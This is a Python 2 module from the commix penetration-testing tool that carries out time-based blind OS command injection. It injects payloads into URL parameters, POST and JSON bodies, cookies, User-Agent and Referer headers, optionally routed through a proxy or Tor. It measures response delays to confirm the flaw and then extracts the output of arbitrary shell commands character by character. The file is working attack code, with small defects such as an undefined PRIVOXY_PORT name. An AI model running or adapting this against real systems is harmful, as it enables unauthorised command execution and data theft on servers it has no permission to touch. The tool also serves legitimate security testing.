#!/usr/bin/env python
# encoding: UTF-8

"""
 This file is part of commix (@commixproject) tool.
 Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
 https://github.com/stasinopoulos/commix

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 For more see the file 'readme/COPYING' for copying permission.
"""

import re
import sys
import time
import json
import string
import random
import base64
import urllib
import urllib2

from src.utils import menu
from src.utils import settings
from src.thirdparty.colorama import Fore, Back, Style, init

from src.core.requests import tor
from src.core.requests import proxy
from src.core.requests import headers
from src.core.requests import parameters

from src.core.injections.blind_based.techniques.time_based import tb_payloads

"""
 The "time-based" injection technique on Blind OS Command Injection.
"""

def examine_requests(payload, vuln_parameter, http_request_method, url):

  start = 0
  end = 0
  start = time.time()

  # Check if defined method is GET (Default).
  if http_request_method == "GET":
    
    payload = urllib.quote(payload)
    
    # Check if its not specified the 'INJECT_HERE' tag
    #url = parameters.do_GET_check(url)
    
    target = re.sub(settings.INJECT_TAG, payload, url)
    vuln_parameter = ''.join(vuln_parameter)
    request = urllib2.Request(target)

  # Check if defined method is POST.
  else :
    parameter = menu.options.data
    parameter = urllib2.unquote(parameter)
    
    # Check if its not specified the 'INJECT_HERE' tag
    parameter = parameters.do_POST_check(parameter)
    
    # Define the POST data   
    if settings.IS_JSON == False:
      data = re.sub(settings.INJECT_TAG, payload, parameter)
      data = data.replace("+","%2B")
      request = urllib2.Request(url, data)
    else:
      payload = payload.replace("\"", "\\\"")
      data = re.sub(settings.INJECT_TAG, urllib.unquote(payload), parameter)
      data = json.loads(data, strict = False)
      request = urllib2.Request(url, json.dumps(data))

    
  # Check if defined extra headers.
  headers.do_check(request)

  # Check if defined any HTTP Proxy.
  if menu.options.proxy:
    try:
      response = proxy.use_proxy(request)
    except urllib2.HTTPError, err:
      print "\n" + Back.RED + "(x) Error: " + str(err) + Style.RESET_ALL
      raise SystemExit() 

  # Check if defined Tor.
  elif menu.options.tor:
    try:
      response = tor.use_tor(request)
    except urllib2.HTTPError, err:
      print "\n" + Back.RED + "(x) Error: " + str(err) + Style.RESET_ALL
      raise SystemExit() 

  else:
    try:
      response = urllib2.urlopen(request)
    except urllib2.HTTPError, err:
      print "\n" + Back.RED + "(x) Error: " + str(err) + Style.RESET_ALL
      raise SystemExit() 
        
  end  = time.time()
  how_long = int(end - start)

  return how_long

#-----------------------------------------
# Check if target host is vulnerable.
#-----------------------------------------
def injection_test(payload, http_request_method, url):
  
  start = 0
  end = 0
  start = time.time()
  
  # Check if defined method is GET (Default).
  if http_request_method == "GET":
    
    # Check if its not specified the 'INJECT_HERE' tag
    #url = parameters.do_GET_check(url)
    
    # Encoding non-ASCII characters payload.
    payload = urllib.quote(payload)
    
    # Define the vulnerable parameter
    vuln_parameter = parameters.vuln_GET_param(url)
      
    target = re.sub(settings.INJECT_TAG, payload, url)
    request = urllib2.Request(target)
              
  # Check if defined method is POST.
  else:
    parameter = menu.options.data
    parameter = urllib2.unquote(parameter)
    
    # Check if its not specified the 'INJECT_HERE' tag
    parameter = parameters.do_POST_check(parameter)
    
    # Define the vulnerable parameter
    vuln_parameter = parameters.vuln_POST_param(parameter, url)
    
    # Define the POST data   
    if settings.IS_JSON == False:
      data = re.sub(settings.INJECT_TAG, payload, parameter)
      request = urllib2.Request(url, data)
    else:
      payload = payload.replace("\"", "\\\"")
      data = re.sub(settings.INJECT_TAG, urllib.unquote(payload), parameter)
      data = json.loads(data, strict = False)
      request = urllib2.Request(url, json.dumps(data))
    
  # Check if defined extra headers.
  headers.do_check(request)
  
  # Check if defined any HTTP Proxy.
  if menu.options.proxy:
    try:
      response = proxy.use_proxy(request)
    except urllib2.HTTPError, err:
      print "\n" + Back.RED + "(x) Error: " + str(err) + Style.RESET_ALL
      raise SystemExit() 

  # Check if defined Tor.
  elif menu.options.tor:
    try:
      response = tor.use_tor(request)
    except urllib2.HTTPError, err:
      print "\n" + Back.RED + "(x) Error: " + str(err) + Style.RESET_ALL
      raise SystemExit() 

  else:
    try:
      response = urllib2.urlopen(request)
    except urllib2.HTTPError, err:
      print "\n" + Back.RED + "(x) Error: " + str(err) + Style.RESET_ALL
      raise SystemExit() 
    
  end  = time.time()
  how_long = int(end - start)

  return how_long, vuln_parameter

# --------------------------------------------------------------
# Check if target host is vulnerable.(Cookie-based injection)
# --------------------------------------------------------------
def cookie_injection_test(url, vuln_parameter, payload):

  def inject_cookie(url, vuln_parameter, payload, proxy):
    if proxy == None:
      opener = urllib2.build_opener()
    else:
      opener = urllib2.build_opener(proxy)
    # Encoding non-ASCII characters payload.
    payload = urllib.quote(payload)
    opener.addheaders.append(('Cookie', vuln_parameter + "=" + payload))
    request = urllib2.Request(url)
    # Check if defined extra headers.
    headers.do_check(request)
    response = opener.open(request)
    return response

  start = 0
  end = 0
  start = time.time()

  proxy = None 
  response = inject_cookie(url, vuln_parameter, payload, proxy)
  
  # Check if defined any HTTP Proxy.
  if menu.options.proxy:
    try:
      proxy = urllib2.ProxyHandler({settings.PROXY_PROTOCOL: menu.options.proxy})
      response = inject_cookie(url, vuln_parameter, payload, proxy)
    except urllib2.HTTPError, err:
      print "\n" + Back.RED + "(x) Error: " + str(err) + Style.RESET_ALL
      raise SystemExit() 

  # Check if defined Tor.
  elif menu.options.tor:
    try:
      proxy = urllib2.ProxyHandler({settings.PROXY_PROTOCOL:settings.PRIVOXY_IP + ":" + PRIVOXY_PORT})
      response = inject_cookie(url, vuln_parameter, payload, proxy)
    except urllib2.HTTPError, err:
      print "\n" + Back.RED + "(x) Error: " + str(err) + Style.RESET_ALL
      raise SystemExit() 

  else:
    try:
      response = inject_cookie(url, vuln_parameter, payload, proxy)
    except urllib2.HTTPError, err:
      print "\n" + Back.RED + "(x) Error: " + str(err) + Style.RESET_ALL
      raise SystemExit() 

  end  = time.time()
  how_long = int(end - start)

  return how_long

# --------------------------------------------------------------
# Check if target host is vulnerable.(User-Agent-based injection)
# --------------------------------------------------------------
def user_agent_injection_test(url, vuln_parameter, payload):

  def inject_user_agent(url, vuln_parameter, payload, proxy):
    if proxy == None:
      opener = urllib2.build_opener()
    else:
      opener = urllib2.build_opener(proxy)

    request = urllib2.Request(url)
    #Check if defined extra headers.
    headers.do_check(request)
    payload = urllib.unquote(payload)
    request.add_header('User-Agent', payload)
    response = opener.open(request)
    return response

  start = 0
  end = 0
  start = time.time()

  proxy = None 
  response = inject_user_agent(url, vuln_parameter, payload, proxy)
  
  # Check if defined any HTTP Proxy.
  if menu.options.proxy:
    try:
      proxy = urllib2.ProxyHandler({settings.PROXY_PROTOCOL: menu.options.proxy})
      response = inject_user_agent(url, vuln_parameter, payload, proxy)
    except urllib2.HTTPError, err:
      print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
      raise SystemExit() 

  # Check if defined Tor.
  elif menu.options.tor:
    try:
      proxy = urllib2.ProxyHandler({settings.PROXY_PROTOCOL:settings.PRIVOXY_IP + ":" + PRIVOXY_PORT})
      response = inject_user_agent(url, vuln_parameter, payload, proxy)
    except urllib2.HTTPError, err:
      print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
      raise SystemExit() 

  else:
    try:
      response = inject_user_agent(url, vuln_parameter, payload, proxy)
    except urllib2.HTTPError, err:
      print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
      raise SystemExit() 

  end  = time.time()
  how_long = int(end - start)

  return how_long

# ------------------------------------------------------------------
# Check if target host is vulnerable.(Referer-based injection)
# ------------------------------------------------------------------
def referer_injection_test(url, vuln_parameter, payload):

  def inject_referer(url, vuln_parameter, payload, proxy):

    if proxy == None:
      opener = urllib2.build_opener()
    else:
      opener = urllib2.build_opener(proxy)

    request = urllib2.Request(url)
    #Check if defined extra headers.
    headers.do_check(request)
    request.add_header('Referer', urllib.unquote(payload))
    response = opener.open(request)
    return response

  start = 0
  end = 0
  start = time.time()

  proxy = None 
  response = inject_referer(url, vuln_parameter, payload, proxy)
  # Check if defined any HTTP Proxy.
  if menu.options.proxy:
    try:
      proxy = urllib2.ProxyHandler({settings.PROXY_PROTOCOL: menu.options.proxy})
      response = inject_referer(url, vuln_parameter, payload, proxy)
    except urllib2.HTTPError, err:
      print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
      raise SystemExit() 

  # Check if defined Tor.
  elif menu.options.tor:
    try:
      proxy = urllib2.ProxyHandler({settings.PROXY_PROTOCOL:settings.PRIVOXY_IP + ":" + PRIVOXY_PORT})
      response = inject_referer(url, vuln_parameter, payload, proxy)
    except urllib2.HTTPError, err:
      print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
      raise SystemExit() 

  else:
    try:
      response = inject_referer(url, vuln_parameter, payload, proxy)
    except urllib2.HTTPError, err:
      print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
      raise SystemExit() 

  end  = time.time()
  how_long = int(end - start)

  return how_long

# -------------------------------------------
# The main command injection exploitation.
# -------------------------------------------
def injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename):

  if menu.options.file_write or menu.options.file_upload:
    minlen = 0
  else:
    minlen = 1

  found_chars = False
  
  sys.stdout.write("(*) Retrieving the length of execution output... ")
  sys.stdout.flush()  

  for output_length in range(int(minlen), int(maxlen)):
    
    if alter_shell:
      # Execute shell commands on vulnerable host.
      payload = tb_payloads.cmd_execution_alter_shell(separator, cmd, output_length, delay, http_request_method)
    else:
      # Execute shell commands on vulnerable host.
      payload = tb_payloads.cmd_execution(separator, cmd, output_length, delay, http_request_method)
          
    # Fix prefixes / suffixes
    payload = parameters.prefixes(payload, prefix)
    payload = parameters.suffixes(payload, suffix)

    if menu.options.base64:
      payload = base64.b64encode(payload)

    # Check if defined "--verbose" option.
    if menu.options.verbose:
      sys.stdout.write("\n" + Fore.GREY + "(~) Payload: " + payload.replace("\n", "\\n") + Style.RESET_ALL)
    
    # Check if defined cookie with "INJECT_HERE" tag
    if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
      how_long = cookie_injection_test(url, vuln_parameter, payload)

    # Check if defined user-agent with "INJECT_HERE" tag
    elif menu.options.agent and settings.INJECT_TAG in menu.options.agent:
      how_long = user_agent_injection_test(url, vuln_parameter, payload)

    # Check if defined referer with "INJECT_HERE" tag
    elif menu.options.referer and settings.INJECT_TAG in menu.options.referer:
      how_long = referer_injection_test(url, vuln_parameter, payload)

    else:  
      how_long = examine_requests(payload, vuln_parameter, http_request_method, url)
    
    if how_long >= delay:
      if output_length > 1:
        if menu.options.verbose:
          print "\n"
        else:
          sys.stdout.write("["+Fore.GREEN+" SUCCEED "+ Style.RESET_ALL+"]\n")
          sys.stdout.flush()
        print Style.BRIGHT + "(!) Retrieved " + str(output_length) + " characters."+ Style.RESET_ALL
        found_chars = True
      break

  if found_chars == True : 
    num_of_chars = output_length + 1
    check_start = 0
    check_end = 0
    check_start = time.time()
    
    output = []

    percent = 0
    sys.stdout.write("\r(*) Grabbing the output, please wait... [ "+str(percent)+"% ]")
    sys.stdout.flush()

    for num_of_chars in range(1, int(num_of_chars)):
      for ascii_char in range(32, 129):
        
        if alter_shell:
          # Get the execution output, of shell execution.
          payload = tb_payloads.get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, delay, http_request_method)
        else:
          # Get the execution output, of shell execution.
          payload = tb_payloads.get_char(separator, cmd, num_of_chars, ascii_char, delay, http_request_method)
          
        # Fix prefixes / suffixes
        payload = parameters.prefixes(payload, prefix)
        payload = parameters.suffixes(payload, suffix)

        if menu.options.base64:
          payload = base64.b64encode(payload)
          
        # Check if defined "--verbose" option.
        if menu.options.verbose:
          sys.stdout.write("\n" + Fore.GREY + "(~) Payload: " + payload.replace("\n", "\\n") + Style.RESET_ALL)

        # Check if defined cookie with "INJECT_HERE" tag
        if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
          how_long = cookie_injection_test(url, vuln_parameter, payload)

        # Check if defined user-agent with "INJECT_HERE" tag
        elif menu.options.agent and settings.INJECT_TAG in menu.options.agent:
          how_long = user_agent_injection_test(url, vuln_parameter, payload)

        # Check if defined referer with "INJECT_HERE" tag
        elif menu.options.referer and settings.INJECT_TAG in menu.options.referer:
          how_long = referer_injection_test(url, vuln_parameter, payload)

        else:    
          how_long = examine_requests(payload, vuln_parameter, http_request_method, url)
                
        if how_long >= delay:
          if not menu.options.verbose:
            output.append(chr(ascii_char))
            percent = ((num_of_chars*100)/output_length)
            float_percent = "{0:.1f}".format(round(((num_of_chars*100)/(output_length*1.0)),2))
            sys.stdout.write("\r(*) Grabbing the output, please wait... [ "+str(float_percent)+"% ]")
            sys.stdout.flush()
          else:
            output.append(chr(ascii_char))
          break
      
    check_end  = time.time()
    check_how_long = int(check_end - check_start)
    output = "".join(str(p) for p in output)

    # Check for empty output.
    if output == (len(output) * " "):
      output = ""

  else:
    check_start = 0
    if not menu.options.verbose:
      sys.stdout.write("["+Fore.RED+" FAILED "+ Style.RESET_ALL+"]\n")
      sys.stdout.flush()
    else:
      print ""
    check_how_long = 0
    output = False

  return  check_how_long, output


# -------------------------------------
# False Positive check and evaluation.
# -------------------------------------
def false_positive_check(separator, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, randvcalc, alter_shell):

  found_chars = False
  if menu.options.verbose: 
    sys.stdout.write("\n(*) Testing the reliability of used payload... ")
    sys.stdout.flush()

  for output_length in range(1, 3):

    if alter_shell:
      # Execute shell commands on vulnerable host.
      payload = tb_payloads.cmd_execution_alter_shell(separator, cmd, output_length, delay, http_request_method)
    else:
      # Execute shell commands on vulnerable host.
      payload = tb_payloads.cmd_execution(separator, cmd, output_length, delay, http_request_method)
          
    # Fix prefixes / suffixes
    payload = parameters.prefixes(payload, prefix)
    payload = parameters.suffixes(payload, suffix)

    if menu.options.base64:
      payload = base64.b64encode(payload)

    # Check if defined "--verbose" option.
    if menu.options.verbose:
      sys.stdout.write("\n" + Fore.GREY + "(~) Payload: " + payload.replace("\n", "\\n") + Style.RESET_ALL)

    # Check if defined cookie with "INJECT_HERE" tag
    if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
      how_long = cookie_injection_test(url, vuln_parameter, payload)

    # Check if defined user-agent with "INJECT_HERE" tag
    elif menu.options.agent and settings.INJECT_TAG in menu.options.agent:
      how_long = user_agent_injection_test(url, vuln_parameter, payload)

    # Check if defined referer with "INJECT_HERE" tag
    elif menu.options.referer and settings.INJECT_TAG in menu.options.referer:
      how_long = referer_injection_test(url, vuln_parameter, payload)

    else:  
      how_long = examine_requests(payload, vuln_parameter, http_request_method, url)

    if how_long >= delay:
      found_chars = True
      break

  if found_chars == True : 
    num_of_chars = output_length + 1
    check_start = 0
    check_end = 0
    check_start = time.time()
    
    output = []
    percent = 0

    sys.stdout.flush()
    for num_of_chars in range(1, int(num_of_chars)):
      for ascii_char in range(1, 3):
        
        if alter_shell:
          # Get the execution output, of shell execution.
          payload = tb_payloads.fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, delay, http_request_method)
        
        else:
          # Get the execution output, of shell execution.
          payload = tb_payloads.fp_result(separator, cmd, num_of_chars, ascii_char, delay, http_request_method)
          
        # Fix prefixes / suffixes
        payload = parameters.prefixes(payload, prefix)
        payload = parameters.suffixes(payload, suffix)

        if menu.options.base64:
          payload = base64.b64encode(payload)

        # Check if defined "--verbose" option.
        if menu.options.verbose:
          sys.stdout.write("\n" + Fore.GREY + "(~) Payload: " + payload.replace("\n", "\\n") + Style.RESET_ALL)

        # Check if defined cookie with "INJECT_HERE" tag
        if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
          how_long = cookie_injection_test(url, vuln_parameter, payload)

        # Check if defined user-agent with "INJECT_HERE" tag
        elif menu.options.agent and settings.INJECT_TAG in menu.options.agent:
          how_long = user_agent_injection_test(url, vuln_parameter, payload)

        # Check if defined referer with "INJECT_HERE" tag
        elif menu.options.referer and settings.INJECT_TAG in menu.options.referer:
          how_long = referer_injection_test(url, vuln_parameter, payload)

        else:    
          how_long = examine_requests(payload, vuln_parameter, http_request_method, url)
                
        if how_long >= delay:
          output.append(ascii_char)
          break
      
    check_end  = time.time()
    check_how_long = int(check_end - check_start)
    output = "".join(str(p) for p in output)

    if str(output) == str(randvcalc):
      return output


# -------------------------------
# Export the injection results
# -------------------------------
def export_injection_results(cmd, separator, output, check_how_long):

  if menu.options.verbose:
    print ""
  if output != "" and check_how_long != 0 :
    print "\n\n" + Fore.GREEN + Style.BRIGHT + output + Style.RESET_ALL
    sys.stdout.write("\n(*) Finished in "+ time.strftime('%H:%M:%S', time.gmtime(check_how_long)) + ".")
    if not menu.options.os_cmd:
      print ""
  else:
    # Check if exists pipe filtration.
    if output != False :
       print "\n" + Fore.YELLOW  + "(^) Warning: It appears that '" + cmd + "' command could not return any output" + (', due to pipe (|) filtration on target.', '.')[separator == "||"]  + Style.RESET_ALL
       print Fore.YELLOW  + "             "+ ('To bypass that limitation, u', 'U')[separator == "||"]  +"se '--alter-shell' or try another injection technique (i.e. '--technique=\"f\"')" + Style.RESET_ALL 
       sys.exit(0)
    # Check for fault command.
    else:
       print Back.RED + "(x) Error: The '" + cmd + "' command, does not return any output." + Style.RESET_ALL + "\n"

#eof